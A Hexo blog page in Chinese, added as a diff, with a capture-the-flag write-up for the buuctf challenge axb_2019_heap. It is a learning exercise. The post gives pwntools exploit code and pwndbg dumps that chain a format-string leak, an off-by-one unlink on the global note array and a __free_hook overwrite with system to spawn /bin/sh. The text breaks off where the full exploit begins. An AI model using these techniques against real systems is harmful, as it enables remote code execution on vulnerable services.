@@ -1,0 +1,524 @@
+<!DOCTYPE html>
+<html lang="Chinese">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.1">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"yoursite.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="关于axb_2019_heap的详解 参考：buuctf  axb_2019_heap  程序流程 banner：存在格式化字符串漏洞，可以泄漏栈上的信息  add：根据idx创建size（大于0x80）大小的内容为content的块 块指针和块大小存放在一个全局变量note中  delete：释放的很干净，没有uaf  edit：存在off by one get_input(*((_QWORD">
+<meta property="og:type" content="article">
+<meta property="og:title" content="axb_2019_heap详解">
+<meta property="og:url" content="http://yoursite.com/2021/04/25/15-11-undefined/index.html">
+<meta property="og:site_name" content="Shuwen&#39;s blog">
+<meta property="og:description" content="关于axb_2019_heap的详解 参考：buuctf  axb_2019_heap  程序流程 banner：存在格式化字符串漏洞，可以泄漏栈上的信息  add：根据idx创建size（大于0x80）大小的内容为content的块 块指针和块大小存放在一个全局变量note中  delete：释放的很干净，没有uaf  edit：存在off by one get_input(*((_QWORD">
+<meta property="og:image" content="http://yoursite.com/2021/04/25/axb-2019-heap%E8%AF%A6%E8%A7%A3/image-20210425142716133.png">
+<meta property="article:published_time" content="2021-04-25T07:11:27.000Z">
+<meta property="article:modified_time" content="2021-04-25T07:12:52.387Z">
+<meta property="article:author" content="Shuwen">
+<meta property="article:tag" content="unlink">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://yoursite.com/2021/04/25/axb-2019-heap%E8%AF%A6%E8%A7%A3/image-20210425142716133.png">
+
+<link rel="canonical" href="http://yoursite.com/2021/04/25/15-11-undefined/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'Chinese'
+  };
+</script>
+
+  <title>axb_2019_heap详解 | Shuwen's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="تشغيل شريط التصفح">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta custom-logo">
+      <div class="site-meta-headline">
+        <a>
+          <img class="custom-logo-image" src="images/shuwen.jpg" alt="Shuwen's blog">
+        </a>
+      </div>
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Shuwen's blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">爱学习的书文</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>الأرشيفات</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="Chinese">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021/04/25/15-11-undefined/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Shuwen">
+      <meta itemprop="description" content="生活 & 学习">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Shuwen's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          axb_2019_heap详解
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">نُشر في</span>
+              
+
+              <time title="أُنشأ: 2021-04-25 15:11:27 / عُدل: 15:12:52" itemprop="dateCreated datePublished" datetime="2021-04-25T15:11:27+08:00">2021-04-25</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">في</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/buu/" itemprop="url" rel="index"><span itemprop="name">buu</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <blockquote>
+<p>关于axb_2019_heap的详解</p>
+<p>参考：<a href="https://blog.csdn.net/weixin_45677731/article/details/108763362" target="_blank" rel="noopener">buuctf  axb_2019_heap</a></p>
+</blockquote>
+<h3 id="程序流程"><a href="#程序流程" class="headerlink" title="程序流程"></a>程序流程</h3><ol>
+<li><p>banner：存在格式化字符串漏洞，可以泄漏栈上的信息</p>
+</li>
+<li><p>add：根据idx创建size（大于0x80）大小的内容为content的块</p>
+<p>块指针和块大小存放在一个全局变量note中</p>
+</li>
+<li><p>delete：释放的很干净，没有uaf</p>
+</li>
+<li><p>edit：存在off by one</p>
+<p><code>get_input(*((_QWORD *)&amp;note + 2 * v1), *((_DWORD *)&amp;note + 4 * v1 + 2));</code></p>
+<p><code>if ( a2 + 1 &lt;= (unsigned int)v3 )</code>v3是以及输入的长度，a2是给定的长度，存在一个字节的溢出</p>
+</li>
+</ol>
+<h4 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h4><blockquote>
+<p>这个程序没有保留调试信息，不能调试，只能一步步看，，，</p>
+<p><a href="https://www.yanbinghu.com/2019/04/20/41283.html" target="_blank" rel="noopener">GDB调试指南</a></p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Reading symbols from axb_2019_heap...(no debugging symbols found)...done.</span><br></pre></td></tr></table></figure>
+
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><ol>
+<li><p>利用格式化字符串泄露栈上信息</p>
+<ul>
+<li><p><code>__libc_start_main+240</code> =&gt; libc基地址</p>
+</li>
+<li><p>(main) ◂— push   rbp =&gt; 程序基地址</p>
+</li>
+</ul>
+</li>
+<li><p>由于存在全局变量note，故可以利用unlink控制chunk指针</p>
+</li>
+<li><p>修改__free_hook为system，get shell</p>
+</li>
+</ol>
+<h3 id="详细过程"><a href="#详细过程" class="headerlink" title="详细过程"></a>详细过程</h3><h4 id="1-格式化字符串"><a href="#1-格式化字符串" class="headerlink" title="1.格式化字符串"></a>1.格式化字符串</h4><blockquote>
+<p>计算偏移：直接算或者用工具 =&gt; 得到偏移为7</p>
+</blockquote>
+<p><img src="/2021/04/25/axb-2019-heap%E8%AF%A6%E8%A7%A3/image-20210425142716133.png" alt="image-20210425142716133"></p>
+<blockquote>
+<p>执行到<code>printf(&amp;format);</code></p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">► 0x555555554b4e &lt;banner+105&gt;    call   printf@plt &lt;printf@plt&gt;</span><br><span class="line">       format: 0x7fffffffde4c ◂— &#39;aaaaaaaa&#39;</span><br><span class="line">       vararg: 0x7fffffffb7b0 ◂— &#39;Hello, our name:&#39;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; stack 30</span><br><span class="line">00:0000│ rsp    0x7fffffffde40 ◂— 0x0</span><br><span class="line">01:0008│ rdi-4  0x7fffffffde48 ◂— 0x61616161ffffde60</span><br><span class="line">02:0010│        0x7fffffffde50 ◂— 0x550061616161 &#x2F;* &#39;aaaa&#39; *&#x2F;	#输入的数据</span><br><span class="line">03:0018│        0x7fffffffde58 ◂— 0xd23db0a55446d00</span><br><span class="line">04:0020│ rbp    0x7fffffffde60 —▸ 0x7fffffffde80 —▸ 0x555555555200 (__libc_csu_init) ◂— push   r15</span><br><span class="line">05:0028│        0x7fffffffde68 —▸ 0x555555555186 (main+28) ◂— mov    eax, 0</span><br><span class="line">06:0030│        0x7fffffffde70 —▸ 0x7fffffffdf60 ◂— 0x1</span><br><span class="line">07:0038│        0x7fffffffde78 ◂— 0x0</span><br><span class="line">08:0040│        0x7fffffffde80 —▸ 0x555555555200 (__libc_csu_init) ◂— push   r15</span><br><span class="line">09:0048│        0x7fffffffde88 —▸ 0x7ffff7a2d840 (__libc_start_main+240) ◂— mov    edi, eax	#可以泄露libc_base</span><br><span class="line">0a:0050│        0x7fffffffde90 ◂— 0x1</span><br><span class="line">0b:0058│        0x7fffffffde98 —▸ 0x7fffffffdf68 —▸ 0x7fffffffe2d3 ◂— &#39;&#x2F;home&#x2F;winter&#x2F;buu&#x2F;axb_2019_heap&#39;</span><br><span class="line">0c:0060│        0x7fffffffdea0 ◂— 0x1f7ffcca0</span><br><span class="line">0d:0068│        0x7fffffffdea8 —▸ 0x55555555516a (main) ◂— push   rbp	#main起始地址，可以泄露程序基地址</span><br></pre></td></tr></table></figure>
+
+<p>所以<code>__libc_start_main+240</code>的偏移为15，<code>main</code>的偏移为19。</p>
+<p>通过计算即可得到libc_base和程序基地址（开启了pie，每次都不一样）</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">p.recvuntil(<span class="string">"Enter your name: "</span>)</span><br><span class="line">payload = <span class="string">"%15$p.%19$p"</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">main_240 = int(p.recvuntil(<span class="string">"."</span>)[<span class="number">-13</span>:<span class="number">-1</span>],<span class="number">16</span>)</span><br><span class="line">push_rbp = int(p.recvuntil(<span class="string">"\n"</span>)[<span class="number">-13</span>:],<span class="number">16</span>)</span><br><span class="line">print(hex(main_240))</span><br><span class="line">print(hex(push_rbp))</span><br><span class="line"></span><br><span class="line">libc_base = main_240 - libc.sym[<span class="string">'__libc_start_main'</span>] - <span class="number">240</span></span><br><span class="line">pro_base = push_rbp - <span class="number">0x116a</span></span><br><span class="line">log.success(hex(libc_base))</span><br><span class="line">log.success(hex(pro_base))</span><br></pre></td></tr></table></figure>
+
+<h4 id="2-unlink"><a href="#2-unlink" class="headerlink" title="2.unlink"></a>2.unlink</h4><blockquote>
+<p>首先计算note地址 = 程序基地址 + note偏移 =&gt; <code>note = pro_base + 0x0202060</code></p>
+<p>接着申请三个块，0x98大小（方便修改下一个chunk）</p>
+<ul>
+<li>第一个chunk：构造fake chunk</li>
+<li>第二个chunk：用于释放，unlink</li>
+<li>第三个chunk：防止第二个chunk和top chunk合并</li>
+</ul>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x55830d656000</span><br><span class="line">Size: 0xa1</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x55830d6560a0</span><br><span class="line">Size: 0xa1</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x55830d656140</span><br><span class="line">Size: 0xa1</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x55830d6561e0</span><br><span class="line">Size: 0x20e21</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;50gx 0x55830d656000</span><br><span class="line">0x55830d656000:	0x0000000000000000	0x00000000000000a1</span><br><span class="line">0x55830d656010:	0x0000000061616161	0x0000000000000000</span><br><span class="line">0x55830d656020:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55830d656030:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55830d656040:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55830d656050:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55830d656060:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55830d656070:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55830d656080:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55830d656090:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55830d6560a0:	0x0000000000000000	0x00000000000000a1</span><br><span class="line">0x55830d6560b0:	0x0000000062626262	0x0000000000000000</span><br><span class="line">0x55830d6560c0:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;30gx 0x55830ca49060</span><br><span class="line">0x55830ca49060 &lt;note&gt;:	0x000055830d656010	0x0000000000000098</span><br><span class="line">0x55830ca49070 &lt;note+16&gt;:	0x000055830d6560b0	0x0000000000000098</span><br><span class="line">0x55830ca49080 &lt;note+32&gt;:	0x000055830d656150	0x0000000000000098</span><br><span class="line">0x55830ca49090 &lt;note+48&gt;:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">add(0,0x98,&#39;aaaa&#39;)</span><br><span class="line">add(1,0x98,&#39;bbbb&#39;)</span><br><span class="line">add(2,0x98,&#39;cccc&#39;)</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p> 通过第一个chunk构造，并off by one修改第二个chunk的大小。</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x55d2cb54e000</span><br><span class="line">Size: 0xa1</span><br><span class="line"></span><br><span class="line">Allocated chunk</span><br><span class="line">Addr: 0x55d2cb54e0a0</span><br><span class="line">Size: 0xa0			#修改标志位，表示上一个chunk被释放</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x55d2cb54e140</span><br><span class="line">Size: 0xa1</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x55d2cb54e1e0</span><br><span class="line">Size: 0x20e21</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;30gx 0x55d2cb54e000</span><br><span class="line">0x55d2cb54e000:	0x0000000000000000	0x00000000000000a1	#第一个chunk</span><br><span class="line">0x55d2cb54e010:	0x0000000000000000	0x0000000000000090	#fake chunk</span><br><span class="line">0x55d2cb54e020:	0x000055d2cb00d048	0x000055d2cb00d050	#fd、bk</span><br><span class="line">0x55d2cb54e030:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x55d2cb54e040:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x55d2cb54e050:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x55d2cb54e060:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x55d2cb54e070:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x55d2cb54e080:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x55d2cb54e090:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x55d2cb54e0a0:	0x0000000000000090	0x00000000000000a0	#pre_size &#x3D; 0x90,size &#x3D; 0xa0</span><br><span class="line">0x55d2cb54e0b0:	0x0000000062626262	0x0000000000000000</span><br><span class="line">0x55d2cb54e0c0:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">note &#x3D; pro_base + 0x0202060</span><br><span class="line">payload &#x3D; p64(0) + p64(0x90)</span><br><span class="line">payload +&#x3D; p64(fd) + p64(bk)</span><br><span class="line">payload +&#x3D; &#39;a&#39; * 0x70</span><br><span class="line">payload +&#x3D; p64(0x90) + p8(0xa0)</span><br><span class="line">print(hex(len(payload)))</span><br><span class="line">edit(0,payload)</span><br><span class="line">print(hex(note))</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>释放第二个chunk，造成unlink，target = target - 0x18</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">#没变化</span><br><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x55682bfdf000</span><br><span class="line">Size: 0xa1</span><br><span class="line"></span><br><span class="line">Allocated chunk</span><br><span class="line">Addr: 0x55682bfdf0a0</span><br><span class="line">Size: 0xa0</span><br><span class="line"></span><br><span class="line">Allocated chunk</span><br><span class="line">Addr: 0x55682bfdf140</span><br><span class="line">Size: 0xa0</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x55682bfdf1e0</span><br><span class="line">Size: 0x20e21</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;30gx 0x55682bfdf000</span><br><span class="line">0x55682bfdf000:	0x0000000000000000	0x00000000000000a1</span><br><span class="line">0x55682bfdf010:	0x0000000000000000	0x0000000000000131	#合并了，大小为0x90 + 0xa0</span><br><span class="line">0x55682bfdf020:	0x00007fea30ac5b78	0x00007fea30ac5b78</span><br><span class="line">0x55682bfdf030:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x55682bfdf040:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x55682bfdf050:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x55682bfdf060:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x55682bfdf070:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x55682bfdf080:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x55682bfdf090:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x55682bfdf0a0:	0x0000000000000090	0x00000000000000a0</span><br><span class="line">0x55682bfdf0b0:	0x0000000062626262	0x0000000000000000</span><br><span class="line">0x55682bfdf0c0:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;30gx 0x55682b44c060</span><br><span class="line">0x55682b44c060 &lt;note&gt;:	0x000055682b44c048	0x0000000000000098#target &#x3D; target - 0x18</span><br><span class="line">0x55682b44c070 &lt;note+16&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55682b44c080 &lt;note+32&gt;:	0x000055682bfdf150	0x0000000000000098</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dele(1)</span><br></pre></td></tr></table></figure>
+
+<h4 id="3-修改-free-hook为system"><a href="#3-修改-free-hook为system" class="headerlink" title="3.修改__free_hook为system"></a>3.修改__free_hook为system</h4><blockquote>
+<p>通过第一个chunk，覆盖第一个chunk的指针指向__free_hook的地址</p>
+<p>设置第二个chunk为参数“/bin/sh\x00”，只要让chunk2指向后面的地址，在上面的地址布置上字符串即可。</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;30gx 0x55cbe5291060</span><br><span class="line">0x55cbe5291060 &lt;note&gt;:	0x00007f962216f7a8	0x0000000000000098		#__free_hook地址</span><br><span class="line">0x55cbe5291070 &lt;note+16&gt;:	0x000055cbe5291078	0x0068732f6e69622f	#binsh地址 binsh字符串</span><br><span class="line">0x55cbe5291080 &lt;note+32&gt;:	0x000055cbe5975100	0x0000000000000098</span><br><span class="line">0x55cbe5291090 &lt;note+48&gt;:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;30gx 0x00007f962216f7a8</span><br><span class="line">0x7f962216f7a8 &lt;__free_hook&gt;:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">system &#x3D; libc_base + libc.sym[&#39;system&#39;]</span><br><span class="line">free_hook &#x3D; libc_base + libc.sym[&#39;__free_hook&#39;]</span><br><span class="line">payload &#x3D; p64(0) * 3</span><br><span class="line">payload +&#x3D; p64(free_hook) + p64(0x98)</span><br><span class="line">payload +&#x3D; p64(note + 24) +&quot;&#x2F;bin&#x2F;sh\x00&quot;</span><br><span class="line">edit(0,payload)</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>第一个chunk指向<code>__free_hook</code>，往chunk1填入数据就是往<code>__free_hook</code>填入数据，修改其为system地址。</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;30gx 0x5578fc638060</span><br><span class="line">0x5578fc638060 &lt;note&gt;:	0x00007f909293e7a8	0x0000000000000098</span><br><span class="line">0x5578fc638070 &lt;note+16&gt;:	0x00005578fc638078	0x0068732f6e69622f</span><br><span class="line">0x5578fc638080 &lt;note+32&gt;:	0x00005578fd63e100	0x0000000000000098</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;30gx 0x00007f909293e7a8</span><br><span class="line">0x7f909293e7a8 &lt;__free_hook&gt;:	0x00007f90925bd3a0</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;30gx 0x00007f90925bd3a0</span><br><span class="line">0x7f90925bd3a0 &lt;__libc_system&gt;:	0xfa86e90b74ff8548</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">edit(0,p64(system))</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>最后，释放第二个chunk即可执行free(2) =&gt; system(“/bin/sh\x00”)</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dele(1)</span><br></pre></td></tr></table></figure>
+
+<h3 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span 